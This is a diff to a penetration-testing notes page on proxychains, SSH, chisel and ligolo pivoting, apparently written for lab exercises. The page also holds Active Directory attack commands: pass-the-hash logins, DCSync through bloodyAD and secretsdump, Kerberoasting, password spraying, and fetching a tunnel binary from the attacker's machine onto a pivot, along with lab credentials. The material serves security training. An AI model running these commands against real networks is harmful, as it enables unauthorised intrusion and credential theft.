@@ -9,6 +9,131 @@ hideFooterPagination: true
 
 {/* Generated from Commands/proxychains.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Draw the path before choosing a tunnel
+
+Write down three machines: your workstation, the pivot you can access, and the internal destination. Record which machine can initiate each connection. A reverse tunnel solves a different reachability problem from a local forward. Keep the listener address, tunnel endpoint, forwarded destination and application target separate in your notes.
+
+### Discover the pivot's network position
+
+```bash
+# On a Linux pivot:
+ip -br addr
+ip route
+ip neigh
+ss -lntup
+```
+
+```powershell
+# On a Windows pivot:
+ipconfig /all
+route print
+Get-NetTCPConnection -State Listen
+Test-NetConnection INTERNAL_IP -Port SERVICE_PORT
+```
+
+A second interface is a lead, not proof that all of its subnet is reachable. First test one known internal host and port from the pivot. A service bound to 127.0.0.1 is reachable only in that host's local context unless you forward it deliberately.
+
+### Choose the smallest connection model that fits
+
+| Need | Useful model | Application connects to |
+| --- | --- | --- |
+| One internal service through SSH | Local forward | A local workstation port |
+| Several TCP services through SSH | Dynamic SOCKS forward | Original destination through a proxy-aware client |
+| Pivot can connect outward, workstation cannot reach pivot SSH | Reverse Chisel tunnel | Workstation SOCKS/local listener |
+| Access a whole internal network with ordinary clients | Ligolo routed tunnel | Internal address through the selected route |
+| Internal host must call a listener through the pivot | Reverse/listener forwarding | A reachable listener on the pivot path |
+
+### Verify a single SSH forward
+
+```bash
+# Run on your workstation. PIVOT_IP is the SSH endpoint.
+ssh -N -L 127.0.0.1:8081:INTERNAL_IP:80 USERNAME@PIVOT_IP
+curl -I http://127.0.0.1:8081/
+```
+
+The destination INTERNAL_IP:80 is reached from the SSH server side. The local 8081 listener belongs to your workstation. If HTTP needs a virtual host, provide its expected Host header; a default page can be a naming problem rather than a failed tunnel.
+
+```bash
+curl -H 'Host: INTERNAL_FQDN' http://127.0.0.1:8081/
+```
+
+### Add SOCKS only when you need multiple destinations
+
+```bash
+ssh -N -D 127.0.0.1:1080 USERNAME@PIVOT_IP
+# Configure a dedicated proxychains file with:
+# socks5 127.0.0.1 1080
+proxychains -f ./proxychains-lab.conf curl http://INTERNAL_IP/
+proxychains -f ./proxychains-lab.conf nmap -sT -Pn -n -p 80,445 INTERNAL_IP
+```
+
+Use TCP-connect applications and narrow port selections. A raw SYN scan, ICMP discovery and UDP probes do not become SOCKS-compatible because a wrapper appears before the command. Determine where DNS resolution occurs; IP reachability and domain resolution are separate tests.
+
+### Troubleshoot from the inside outward
+
+1. From the pivot, verify the destination service itself.
+2. Confirm the tunnel connection/session is live and attached to the intended pivot.
+3. Verify the listener or route on the workstation.
+4. Test one connection using the same client/proxy configuration as the final tool.
+5. Only then investigate application authentication, hostnames or protocol settings.
+
+```bash
+# On the workstation:
+ss -lntp
+ip route get INTERNAL_IP
+```
+
+For chained pivots, repeat this evidence for each hop. Document routes and listeners so you can remove the exact entries at the end. Do not delete a default/VPN route merely to make a conflicting lab subnet work; inspect the more-specific route first.
+
+## Proxychains: choose the operation and read the result
+
+Send supported TCP connections through a configured SOCKS proxy.
+
+### What the result establishes
+
+Confirm the configured proxy type/address and test one TCP connection before using a larger enumeration tool.
+
+### Prerequisites and common failures
+
+This wraps compatible application connections; it does not transparently proxy raw SYN, ICMP or every UDP workflow, and DNS handling needs attention.
+
+### Example 1: Commands
+
+Run in: **Kali**. Configure the running SOCKS proxy in /etc/proxychains4.conf first; use the saved setup link below.
+
+```bash
+proxychains -q nmap -sT -Pn TARGET_IP
+proxychains -q ssh USER@TARGET_IP
+```
+
+### Example 2: Proxychains and SSH Tunnels
+
+Run in: **Saved lab example**.
+
+```bash
+# /etc/proxychains4.conf  -> last line
+socks5 127.0.0.1 1080
+# use it
+proxychains -q nmap -sT -Pn 172.16.5.19
+proxychains -q nxc smb 172.16.5.0/24
+```
+
+Saved context: [Proxychains and SSH Tunnels — Proxychains and SSH Tunnels](/pivoting/proxychains). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Step 2 — Route tools through the proxy (proxychains)
+
+Run in: **Saved lab example**.
+
+```bash
+sudo nano /etc/proxychains4.conf
+```
+
+Saved context: [Pass the Ticket from Linux — Step 2 — Route tools through the proxy (proxychains)](/password-attacks/pass-the-ticket-from-linux#step-2-—-route-tools-through-the-proxy-proxychains). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Send supported TCP connections through a configured SOCKS proxy.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=proxychains) · [All tools](/index)
@@ -53,6 +178,13 @@ proxychains evil-winrm -i 172.16.119.11 -u stom -p 'calves-warp-learning1'
 proxychains evil-winrm -i 172.16.119.11 -u Administrator -H <NTHASH>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 10. Domain compromise (DCSync)](/cheatsheets/ad-attack-path-worked-example#10-domain-compromise-dcsync)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="6. Internal AD enumeration">
@@ -80,6 +212,13 @@ proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11
 proxychains bloodyAD --host 172.16.119.11 -d nexura.htb -u bdavid -p '...' get writable
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 6. Internal AD enumeration](/cheatsheets/ad-attack-path-worked-example#6-internal-ad-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="7. Cracking loot">
@@ -99,6 +238,13 @@ john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
 passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 7. Cracking loot](/cheatsheets/ad-attack-path-worked-example#7-cracking-loot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Option A — chisel + proxychains (SOCKS)">
@@ -116,6 +262,13 @@ wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 # Kali: /etc/proxychains4.conf  ->  socks5 127.0.0.1 1080
 proxychains nxc smb 172.16.119.11 -u user -p pass
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option A — chisel + proxychains (SOCKS)](/cheatsheets/ad-attack-path-worked-example#option-a-—-chisel-+-proxychains-socks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -138,12 +291,26 @@ nxc smb 172.16.119.11 -u user -p pass
 xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 ```bash
 ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
 xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools) · [Windows Remote Access: RDP, WinRM, and WMI — Example 6: Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/enumeration/windows-remote-management-protocols-cheat-sheet#example-6-option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -157,6 +324,13 @@ xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
 # SOCKS proxy must be up; DNS must reach the DC -> use --dns-tcp
 proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — Collecting over a pivot](/cheatsheets/bloodhound-complete-guide#collecting-over-a-pivot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -175,6 +349,13 @@ proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add dcsync <yo
 proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Administrator
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — Group → DCSync chain (what we'd have done with bdavid if those edges were outbound)](/cheatsheets/bloodhound-complete-guide#group-→-dcsync-chain-what-we-d-have-done-with-bdavid-if-those-edges-were-outbound)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="No‑GUI shortcut: bloodyAD">
@@ -189,6 +370,13 @@ proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get writable 
 proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <target> --attr memberOf
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — No‑GUI shortcut: bloodyAD](/cheatsheets/bloodhound-complete-guide#no‑gui-shortcut-bloodyad)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="The three reusable &quot;I control a user&quot; primitives">
@@ -202,6 +390,13 @@ proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' set password <
 # or:  net rpc password <target> 'Newpass123!' -U '<domain>/<you>%<pass>' -S <DC>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — The three reusable "I control a user" primitives](/cheatsheets/bloodhound-complete-guide#the-three-reusable-i-control-a-user-primitives)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **BloodHound: Full Reference**
 
 ```bash
@@ -209,12 +404,26 @@ proxychains certipy shadow auto -u <you>@<domain> -p '<pass>' -account <target> 
 #   -> prints the target's NT hash. (pywhisker + gettgtpkinit is the manual equivalent.)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — The three reusable "I control a user" primitives](/cheatsheets/bloodhound-complete-guide#the-three-reusable-i-control-a-user-primitives)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **BloodHound: Full Reference**
 
 ```bash
 proxychains python3 targetedKerberoast.py -d <domain> -u <you> -p '<pass>' --request-user <target>
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — The three reusable "I control a user" primitives](/cheatsheets/bloodhound-complete-guide#the-three-reusable-i-control-a-user-primitives)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -233,6 +442,13 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 proxychains nxc smb 172.16.5.0/24
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Chisel: Quick Tunnel Reference — Existing notes and worked examples](/pivoting/chisel#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Mental model">
@@ -249,6 +465,13 @@ In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
 Need the internal net? → autoroute + socks_proxy → proxychains everything else
 Always: LHOST = your tun0, payload in venom must match the handler
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Mental model](/exploitation/metasploit-framework-cheat-sheet#mental-model)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -268,6 +491,13 @@ meterpreter > run autoroute -s 172.16.5.0/24
 msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools through it
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Metasploit Framework: Startup to Sessions — Post-exploitation & pivoting](/exploitation/metasploit-framework-cheat-sheet#post-exploitation-&-pivoting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
@@ -280,6 +510,13 @@ msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools th
 # [ON KALI] pull it THROUGH the tunnel (note proxychains + the internal IP)
 proxychains wget http://172.16.1.15:8080/krb5cc_647401106_8Dt6uj
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -296,6 +533,13 @@ klist                                        # confirm it loaded and is still va
 proxychains impacket-wmiexec dc01 -k         # -k = use Kerberos; target by NAME, not IP
 proxychains evil-winrm -i dc01 -r inlanefreight.htb
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 6 — Load the ticket and run tools through proxychains](/password-attacks/pass-the-ticket-from-linux#step-6-—-load-the-ticket-and-run-tools-through-proxychains)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -317,6 +561,13 @@ printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 
 proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — 🔁 Mutating a known OLD password (the stom case)](/password-attacks/password-attacks-cheat-sheet#-mutating-a-known-old-password-the-stom-case)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="🔒 Lockout discipline (don&#x27;t lock the account)">
@@ -330,6 +581,13 @@ proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]
 proxychains nxc smb <DC> -u <valid_user> -p '<valid_pass>' --pass-pol
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — 🔒 Lockout discipline (don't lock the account)](/password-attacks/password-attacks-cheat-sheet#-lockout-discipline-dont-lock-the-account)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Dynamic forwarding: -D">
@@ -341,6 +599,13 @@ proxychains nxc smb <DC> -u <valid_user> -p '<valid_pass>' --pass-pol
 ```bash
 proxychains nmap -v -sT -Pn 172.16.5.19
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting Fundamentals: Routes, SOCKS, and Forwards — Dynamic forwarding: -D](/pivoting/fundamentals#dynamic-forwarding-d)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -364,6 +629,13 @@ xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychain
 ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 1. SSH port forwarding (no tools needed)](/cheatsheets/pivoting-file-transfer#1-ssh-port-forwarding-no-tools-needed)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2. chisel (SOCKS + port forwards)">
@@ -386,6 +658,13 @@ ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
 ./chisel client <KALI_IP>:9001 R:172.16.119.13:8000:127.0.0.1:8000
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 2. chisel (SOCKS + port forwards)](/cheatsheets/pivoting-file-transfer#2-chisel-socks-+-port-forwards)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2 · Metasploit routing (pivot through a session)">
@@ -404,6 +683,13 @@ use auxiliary/server/socks_proxy        # SRVPORT 9050, VERSION 5, run -j
 # then proxychains (socks5 127.0.0.1 9050) your nmap/xfreerdp/etc.
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — 2 · Metasploit routing (pivot through a session)](/modules/pivoting-tunneling-port-forwarding#2-·-metasploit-routing-pivot-through-a-session)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Dynamic port forwarding (-D) → SOCKS + proxychains">
@@ -417,6 +703,13 @@ ssh -D 9050 ubuntu@pivot           # SOCKS5 proxy on your 127.0.0.1:9050
 # /etc/proxychains4.conf → last line:  socks5 127.0.0.1 9050
 proxychains -q nmap -sT -Pn 172.16.5.0/24
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — Dynamic port forwarding (-D) → SOCKS + proxychains](/modules/pivoting-tunneling-port-forwarding#dynamic-port-forwarding-d-→-socks-+-proxychains)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -434,6 +727,13 @@ proxychains -q nmap -sT -Pn 172.16.5.19
 proxychains -q nxc smb 172.16.5.0/24
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Proxychains and SSH Tunnels — Existing notes and worked examples](/pivoting/proxychains#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="sshuttle: Route a Subnet over SSH">
@@ -449,6 +749,13 @@ sshuttle -r ubuntu@pivot 172.16.5.0/23 -x pivot  # exclude the pivot itself
 nmap -sT -Pn 172.16.5.19
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [sshuttle: Route a Subnet over SSH — Example 2: sshuttle: Route a Subnet over SSH](/tools/sshuttle#example-2-sshuttle-route-a-subnet-over-ssh) · [sshuttle: Route a Subnet over SSH — Existing notes and worked examples](/tools/sshuttle#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="11. File transfer over a pivot">
@@ -462,6 +769,13 @@ Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali �
 ```text
 proxychains impacket-smbserver
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot) · [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -477,6 +791,13 @@ Context from the notebook: wget  to internal IP hangs/refused Kali can't reach i
 proxychains wget
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="proxychains config (/etc/proxychains4.conf)">
@@ -491,6 +812,13 @@ Context from the notebook: Kali uses  /etc/proxychains4.conf  (the  4 ), not  pr
 proxychains <tool> ...
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — proxychains config (/etc/proxychains4.conf)](/cheatsheets/pivoting-file-transfer#proxychains-config-/etc/proxychains4-conf)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting and File Transfer: Field Reference**
 
 Context from the notebook: Kali uses  /etc/proxychains4.conf  (the  4 ), not  proxychains.conf . Comment out the default Tor  socks4 ... 9050  line. Use  socks5 , not  socks4 , for DNS + reliability. Usage:  proxychains &lt;tool> ... . Add  -q  to silence the chain spam:  proxychains -q nxc ... .
@@ -498,6 +826,13 @@ Context from the notebook: Kali uses  /etc/proxychains4.conf  (the  4 ), not  pr
 ```text
 proxychains -q nxc ...
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — proxychains config (/etc/proxychains4.conf)](/cheatsheets/pivoting-file-transfer#proxychains-config-/etc/proxychains4-conf)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -513,6 +848,21 @@ Context from the notebook: proxychains -q  silences the per-connection chatter.
 proxychains -q
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — 4 · proxychains — the glue](/modules/pivoting-tunneling-port-forwarding#4-·-proxychains-—-the-glue)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Proxychains and SSH Tunnels](/pivoting/proxychains)
+
+{/* VAULT_RELATED_END */}
